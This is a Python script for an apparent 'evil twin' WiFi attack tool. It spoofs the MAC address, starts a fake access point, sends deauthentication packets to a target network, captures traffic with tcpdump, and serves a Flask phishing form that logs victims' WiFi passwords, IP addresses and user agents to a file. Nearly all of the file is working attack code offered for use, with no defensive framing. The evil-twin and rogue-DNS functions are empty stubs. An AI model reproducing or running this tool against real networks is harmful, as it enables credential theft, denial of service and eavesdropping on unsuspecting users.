import subprocess
import time
import re
import os
import random
import string
import hashlib
import requests
from flask import Flask, request

app = Flask(__name__)

# ASCII Art Banner
def print_banner():
    print("""
     ____        _          _____           _     _      
    |  _ \ _   _| |_ ___ _ | ____|_ __ __ _| |__ (_)_ __
    | |_) | | | | __/ _ \ ||  _| | '__/ _` | '_ \| | '__|
    |  __/| |_| | ||  __/ || |___| | | (_| | | | | | |   
    |_|    \__,_|\__\___| ||_____|_|  \__,_|_| |_|_|_|   
    |__/
    """)

# WiFi Adapter Detection and Monitor Mode Check
def check_wifi_adapter(adapter):
    print(f"Checking if {adapter} is in monitor mode...")
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if adapter not in result.stdout:
            print(f"[!] {adapter} not found, or not in monitor mode. Please ensure it's in monitor mode.")
            print("[*] Run 'airmon-ng start <adapter>' to enable monitor mode.")
            return False
        else:
            print(f"[*] {adapter} is in monitor mode.")
            return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

# MAC Address Spoofing
def spoof_mac_address(adapter):
    try:
        print(f"[*] Spoofing MAC address for {adapter}...")
        subprocess.run(f"sudo macchanger -r {adapter}", shell=True, check=True)
        print(f"[*] MAC address spoofed successfully for {adapter}.")
    except subprocess.CalledProcessError:
        print(f"[!] Error changing MAC address for {adapter}.")

# Start Fake WiFi Access Point
def start_access_point(adapter, bssid):
    try:
        print("[*] Starting fake WiFi access point...")
        subprocess.run(f"sudo hostapd -B hostapd.conf", shell=True, check=True)
        print(f"[*] Access point {bssid} started.")
    except subprocess.CalledProcessError:
        print("[!] Error starting access point.")

# Deauthentication Attack
def deauth_attack(target_bssid, adapter):
    try:
        print(f"[*] Sending deauthentication packets to {target_bssid}...")
        subprocess.run(f"sudo aireplay-ng --deauth 100 -a {target_bssid} {adapter}", shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"[!] Error during deauth attack.")

# Hidden SSID Detection
def hidden_ssid_detection():
    print("[*] Scanning for hidden SSIDs...")
    result = subprocess.run(["iwlist", "scan"], capture_output=True, text=True)
    hidden_ssids = re.findall(r"ESSID:\"([^\"]+)\"", result.stdout)
    for ssid in hidden_ssids:
        print(f"[*] Detected hidden SSID: {ssid}")

# Channel Hopping for Better Scanning
def channel_hop(adapter):
    print(f"[*] Hopping channels on {adapter}...")
    try:
        subprocess.run(f"sudo iw dev {adapter} set channel {random.randint(1, 11)}", shell=True, check=True)
        print(f"[*] Channel hopping completed on {adapter}.")
    except subprocess.CalledProcessError:
        print(f"[!] Error hopping channels on {adapter}.")

# Evil Twin Attack (Clone a Legitimate AP)
def evil_twin_attack():
    print("[*] Starting Evil Twin attack...")
    pass  # Add specific attack steps

# Rogue DNS Setup for Phishing
def rogue_dns_setup():
    print("[*] Setting up rogue DNS...")
    pass  # Implement rogue DNS for phishing page

# Packet Sniffing for Unencrypted Traffic
def packet_sniffing(interface):
    print(f"[*] Sniffing packets on {interface}...")
    try:
        subprocess.run(f"sudo tcpdump -i {interface} -w captured_traffic.pcap", shell=True)
    except subprocess.CalledProcessError:
        print("[!] Error starting packet sniffing.")

# Flask Web Server for Credential Capture
@app.route("/", methods=["GET", "POST"])
def capture_password():
    if request.method == "POST":
        password = request.form["password"]
        user_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        print(f"[!] Captured Password: {password} from {user_ip}, {user_agent}")
        with open("captured_passwords.txt", "a") as f:
            f.write(f"{password},{user_ip},{user_agent}\n")
        return "Password Captured!"
    return '''
        <form method="POST">
            <label for="password">WiFi Password:</label><br>
            <input type="text" id="password" name="password"><br><br>
            <input type="submit" value="Submit">
        </form>
    '''

# Geolocation of User (IP Lookup)
def geolocate_user(ip_address):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        data = response.json()
        print(f"[*] Geolocation: {data['city']}, {data['regionName']}, {data['country']}")
    except requests.RequestException:
        print("[!] Error getting geolocation.")

# Main Function to Run the Tool
def main():
    print_banner()
    
    # Get WiFi Adapter from User
    adapter = input("[*] Enter your WiFi adapter name (e.g., wlan0): ").strip()
    
    if not check_wifi_adapter(adapter):
        return
    
    # Ask user for BSSID
    bssid = input("[*] Enter the custom BSSID for the access point (e.g., 00:11:22:33:44:55): ").strip()
    if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
        print("[!] Invalid BSSID format!")
        return
    
    # Start Access Point
    start_access_point(adapter, bssid)
    
    # Perform Deauth Attack
    target_bssid = input("[*] Enter the target BSSID for deauth attack: ").strip()
    deauth_attack(target_bssid, adapter)
    
    # Start Flask Web Server to Capture Passwords
    print("[*] Starting Flask web server to capture passwords...")
    app.run(host="0.0.0.0", port=80, debug=False)

if __name__ == "__main__":
    main()
